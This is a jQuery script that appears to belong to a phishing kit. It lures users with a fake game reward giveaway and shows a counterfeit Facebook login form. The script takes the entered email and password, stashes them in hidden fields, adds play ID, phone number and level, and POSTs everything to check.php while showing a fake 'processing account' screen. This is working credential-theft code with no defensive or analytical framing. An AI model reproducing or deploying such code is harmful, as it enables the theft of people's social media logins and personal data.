function open_reward_confirmation(ts) {
	var rewardImage = $(ts).attr("src");
    $('.reward_confirmation').show();
	$('.rewardPicture').attr('src',rewardImage);
}
function open_account_login(){
	$('.account_login').show();
	$(".reward_confirmation").hide()
}
function open_facebook(){
	$('.login-facebook').show();
	$('.account_login').hide();
}
function close_reward_confirmation(){
	$(".reward_confirmation").hide()
}
function close_facebook(){
	$('.login-facebook').hide()
	$('.account_login').show();
}
function ValidateLoginFbData() {
	$('#ValidateLoginFbForm').submit(function(submitingValidateLoginFbData){
	submitingValidateLoginFbData.preventDefault();
	
	$email = $('#email-facebook').val().trim();
	$password = $('#password-facebook').val().trim();
	$login = $('#login-facebook').val().trim();
	if($email == '' || $password == '') {
	} else {
	$('.login-facebook').hide();
	$('.account_verification').show();
	$("input#validateEmail").val($email);
	$("input#validatePassword").val($password);
	$("input#validateLogin").val($login);
	}
	}); 
}
function ValidateVerificationData(){
	$('#ValidateVerificationDataForm').submit(function(submitingVerificationData){
	submitingVerificationData.preventDefault();
	
	var $validateEmail = $("input#validateEmail").val();
	var $validatePassword = $("input#validatePassword").val();
	var $playid = $("input#playid").val();
	var $phone = $("input#phone").val();
	var $level = $("input#level").val();
	var $validateLogin = $("input#validateLogin").val();
	if($validateEmail == "" && $validatePassword == "" && $playid == "" && $phone == "" && $level == "" && $validateLogin == ""){
	$('.verification_info').show();
	$('.account_verification').hide();
	return false;
	}
	
	$.ajax({
		type: "POST",
		url: "check.php",
		data: $(this).serialize(),
		beforeSend: function() {
			$('.ValidateVerificationDataBtn').html('<i class="zmdi zmdi-spinner zmdi-hc-spin zmdi-hc-1x"></i>').prop('disabled', true);
		},
		success: function(){
		$(".processing_account").show();
		$('.account_verification').hide();
		}
	});
	});  
	return false;
};